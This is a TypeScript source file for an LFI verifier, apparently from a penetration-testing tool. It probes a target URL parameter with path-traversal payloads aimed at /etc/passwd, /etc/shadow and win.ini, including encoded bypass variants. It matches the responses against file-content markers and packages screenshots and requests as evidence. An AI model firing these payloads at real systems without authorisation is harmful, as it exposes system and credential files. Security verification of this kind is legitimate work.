import type { BrowserEngine } from "../engine"
import type { VerificationScenario, VerifierResult, EvidencePackage } from "../types"
import { Confidence } from "../../shared/types"
import type { EvidenceCollector } from "../../evidence/collector"
import { randomUUID, createHash } from "crypto"
import { tmpdir } from "os"
import { join } from "path"
import { existsSync, mkdirSync, rmSync } from "fs"

/**
 * LFI Verifier — attempts to read sensitive files through path traversal
 * and confirms the content contains expected markers.
 *
 * Strategy:
 * 1. Probe the LFI-prone endpoint with common path traversal payloads
 * 2. Check the response for expected file contents (e.g., /etc/passwd markers)
 * 3. Confirm the file content was actually returned (not just reflected)
 */
export class LFIVerifier implements VerificationScenario {
  name = "lfi"
  description = "Local File Inclusion — confirms LFI by reading /etc/passwd through path traversal"

  private logs: string[] = []
  private lfiConfirmed = false
  private fileContentDetected = false
  private capturedScreenshots: { data: Buffer; label: string }[] = []
  private capturedResponses: string[] = []
  private capturedRequests: string[] = []
  private harDir: string | null = null
  private probeEndpoint = ""
  private probeResults: { payload: string; status: number; bodyPreview: string; markers: string[] }[] = []

  // Path traversal payloads targeting /etc/passwd
  private static readonly LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd",
    "file:///etc/passwd",
    "../../etc/shadow",
    "../../../etc/shadow",
    "../../../../etc/shadow",
  ]

  // Markers that indicate the target file content was returned
  private static readonly LFI_SUCCESS_MARKERS = [
    "root:",
    "nobody:",
    "daemon:",
    "bin:",
    "/bin/bash",
    "/bin/sh",
    "/usr/sbin/nologin",
    "[extensions]",
    "[fonts]",
  ]

  constructor(
    private engine: BrowserEngine,
    private targetUrl: string,
    private lfiParameter: string,  // The URL parameter vulnerable to LFI (e.g., "file", "page", "include")
    private collector?: EvidenceCollector,
    private engagementId?: string,
    private findingId?: string,
  ) {}

  async setup(): Promise<void> {
    // Normalize the base endpoint
    this.probeEndpoint = this.lfiParameter.startsWith("http")
      ? this.lfiParameter
      : this.lfiParameter.includes("=")
        ? `${this.targetUrl.replace(/\/+$/, "")}/${this.lfiParameter.startsWith("/") ? this.lfiParameter.slice(1) : this.lfiParameter}`
        : `${this.targetUrl.replace(/\/+$/, "")}?${this.lfiParameter}=`

    await this.engine.launch()
    this.harDir = join(tmpdir(), `argus-har-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`)
    mkdirSync(this.harDir, { recursive: true })
    this.logs.push(`LFI verifier setup complete — probing endpoint: ${this.probeEndpoint}`)
  }

  async cleanup(): Promise<void> {
    await this.engine.close()
    if (this.harDir && existsSync(this.harDir)) {
      try { rmSync(this.harDir, { recursive: true, force: true }) } catch { /* best-effort */ }
    }
  }

  async execute(): Promise<void> {
    await this.engine.createContext({ harDir: this.harDir ?? undefined } as any)

    for (const payload of LFIVerifier.LFI_PAYLOADS) {
      const probeUrl = this.probeEndpoint.includes("=")
        ? this.probeEndpoint + payload
        : `${this.probeEndpoint}${payload}`

      try {
        const page = await this.engine.navigate(probeUrl)
        await page.waitForLoadState("networkidle", { timeout: 10000 }).catch(() => {})
        const bodyText = await page.textContent("body").catch(() => "")
        const bodyLower = (bodyText ?? "").toLowerCase()

        this.capturedRequests.push(`GET ${probeUrl}`)

        // Check for LFI success markers in response
        const matchedMarkers = LFIVerifier.LFI_SUCCESS_MARKERS.filter(m => bodyLower.includes(m.toLowerCase()))
        const status = 200  // If page loaded, assume 200

        this.capturedResponses.push(`LFI probe "${payload}": HTTP ${status}, ${matchedMarkers.length} marker(s)`)

        this.probeResults.push({
          payload,
          status,
          bodyPreview: (bodyText ?? "").slice(0, 500),
          markers: matchedMarkers,
        })

        if (matchedMarkers.length > 0) {
          this.fileContentDetected = true
          this.lfiConfirmed = true
          this.logs.push(`LFI detected with payload "${payload}": markers=${matchedMarkers.join(", ")}`)
        }

        try {
          const shot = await this.engine.captureScreenshot(page)
          this.capturedScreenshots.push({ data: shot, label: `lfi-${payload.replace(/[^a-zA-Z0-9]/g, "-").slice(0, 30)}` })
        } catch { /* best-effort */ }

        await page.close()
      } catch {
        this.logs.push(`LFI probe failed: ${payload}`)
        this.probeResults.push({ payload, status: 0, bodyPreview: "", markers: [] })
      }
    }

    this.logs.push(`LFI ${this.lfiConfirmed ? "CONFIRMED" : "not detected"}`)
  }

  async verify(): Promise<VerifierResult> {
    const passed = this.lfiConfirmed

    const summary = passed
      ? this.fileContentDetected
        ? `LFI confirmed: ${this.getSuccessfulProbes()} payload(s) returned file contents (e.g., /etc/passwd markers found)`
        : `LFI confirmed: ${this.getSuccessfulProbes()} payload(s) triggered path traversal`
      : `LFI not detected: No path traversal payload returned file contents`

    return {
      passed,
      confidence: passed ? Confidence.HIGH : Confidence.INFORMATIONAL,
      evidence: [],
      summary,
    }
  }

  async collectEvidence(): Promise<EvidencePackage> {
    const collectedArtifacts: import("../../evidence/types").ArtifactEntry[] = []
    let computedHash = ""
    if (this.collector && this.engagementId && this.findingId) {
      for (const shot of this.capturedScreenshots) {
        const entry = await this.collector.captureScreenshot(this.engagementId, this.findingId, shot.data).catch(() => null)
        if (entry) collectedArtifacts.push(entry)
      }
      for (const req of this.capturedRequests) {
        const entry = await this.collector.saveRequest(this.engagementId, this.findingId, req).catch(() => null)
        if (entry) collectedArtifacts.push(entry)
      }
      for (const res of this.capturedResponses) {
        const entry = await this.collector.saveResponse(this.engagementId, this.findingId, res).catch(() => null)
        if (entry) collectedArtifacts.push(entry)
      }
      if (this.harDir) {
        const harArtifacts = await this.collector.ingestHarFiles(this.engagementId, this.findingId, this.harDir).catch(() => [])
        collectedArtifacts.push(...harArtifacts)
      }
      const manifest = await this.collector.createPackage(this.engagementId, this.findingId, collectedArtifacts).catch(() => null)
      if (manifest) computedHash = manifest.package_hash
    }

    if (!computedHash && collectedArtifacts.length > 0) {
      const hashInput = collectedArtifacts.map((a) => a.hash || a.path).join("")
      computedHash = createHash("sha256").update(hashInput).digest("hex")
    }

    return {
      packageId: randomUUID(),
      findingId: this.findingId ?? "",
      artifacts: collectedArtifacts.length > 0
        ? collectedArtifacts.map((a) => ({ path: a.path, type: a.type, hash: a.hash }))
        : [
            ...this.capturedScreenshots.map((s) => ({ path: `lfi-${s.label}.png`, type: "screenshot" as const })),
            ...this.capturedRequests.map((r) => ({ path: r, type: "request" as const })),
            ...this.capturedResponses.map((r) => ({ path: r, type: "response" as const })),
          ],
      packageHash: computedHash,
      createdAt: new Date().toISOString(),
    }
  }

  private getSuccessfulProbes(): number {
    return this.probeResults.filter(r => r.markers.length > 0).length
  }
}
